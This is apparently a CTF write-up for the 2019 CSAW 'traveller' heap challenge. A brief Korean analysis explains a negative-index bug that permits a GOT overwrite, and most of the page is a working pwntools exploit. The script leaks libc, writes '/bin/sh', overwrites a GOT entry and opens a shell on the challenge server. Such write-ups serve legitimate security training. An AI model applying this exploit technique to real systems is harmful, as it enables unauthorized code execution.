---
title: CSAW travller write up
categories: [2019, CSAW]
tags: [CTF, pwn, heap]
---

CSAW write up

subject   | problem
----------|------------
CTF       | 2019 CSAW
Tags      | pwn
score     | 200
env       | ubuntu 18.04
problem   | x64, heap

# analysis

메모리를 할당, write, read를 할 수 있는 프로그램이다. 
index에 마이너스가 들어가기 때문에 이를 이용하면 got부분을 write해 eip컨트롤이 가능하다.

# ex.py

``` python
#!/usr/bin/env/python
# powerprove

from pwn import *
import sys

if len(sys.argv) < 2:
    host = "localhost"
    port = 4000
else:
    host = "pwn.chal.csaw.io"
    port = 1003

def leak():
    s.recvuntil(". \n")
    libc_base = int(s.recvuntil("\n")[:-1], 16)
    return libc_base

def inp(data):
    s.recvuntil("> ")
    s.sendline(str(data))

def menu(index):
    inp(index)

def add(size, data):
    inp(1)
    inp(size)
    s.recvuntil(": ")
    s.sendline(data)

if __name__ == "__main__":
    s = remote(host, port)

    libc_base = leak()
    log.info("libc_base         : " + str(hex(libc_base)))

    add(5, "/bin/sh")
    menu(2)
    s.recvuntil(": ")
    s.sendline("-262194")
    sleep(0.3)
    s.sendline(p64(0x000000000400710))
    menu(3)
    s.sendline("0")

    s.interactive()
```